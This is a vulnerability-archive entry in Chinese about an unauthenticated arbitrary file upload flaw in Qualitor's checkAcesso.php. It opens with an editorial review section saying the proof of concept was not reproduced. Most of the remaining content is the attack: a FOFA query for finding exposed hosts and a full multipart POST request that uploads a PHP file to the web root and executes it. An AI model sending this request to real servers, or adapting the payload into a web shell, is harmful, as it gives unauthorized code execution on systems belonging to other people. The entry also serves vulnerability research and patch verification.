---
source: "wy876 漏洞文库"
id: "vw-1fd246a6d47c37b659c275fc"
entity_id: "ve-1fd246a6d47c37b659c275fc"
schema_version: "1"
title: "Qualitor checkAcesso.php存在任意文件上传漏洞"
product: "Qualitor服务管理Web平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "idtipo=2目录为当前目录，无认证头，版本未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Qualitor/QualitorcheckAcesso.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yiooigqwix8pxlaz"
source_status: "recorded"
---

# Qualitor checkAcesso.php存在任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Qualitor服务管理Web平台
- 本文讨论：checkAcesso.php上传；边界文本含2024-44849但未正式映射
- 版本、权限与配置前提：idtipo=2目录为当前目录，无认证头，版本未给
- 资料类型：上传请求摘录；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 安全设备分类不精确，应业务服务管理产品
- 无上传/访问响应，PHP执行与匿名权限待证
- multipart边界内CVE字样只是线索不能自动赋主CVE
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- CVE-2024-44849映射、版本与响应待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Qualitor checkAcesso.php存在任意文件上传漏洞

# 二、影响版本
+ Qualitor 

# 三、资产测绘
+ fofa`app="Qualitor-Web"`
+ 特征


# 四、漏洞复现
```http
POST /html/ad/adfilestorage/request/checkAcesso.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=---------------------------QUALITORspaceCVEspace2024space44849
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="idtipo"
 
2
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmfilestorage"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmdiretoriorede"
 
.
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmbucket"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmaccesskey"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmkeyid"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="fleArquivo"; filename="info.php"
 
<?php phpinfo();unlink(__FILE__);?>
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="cdfilestorage"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849--
```


```java
/html/ad/adfilestorage/request/info.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yiooigqwix8pxlaz>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
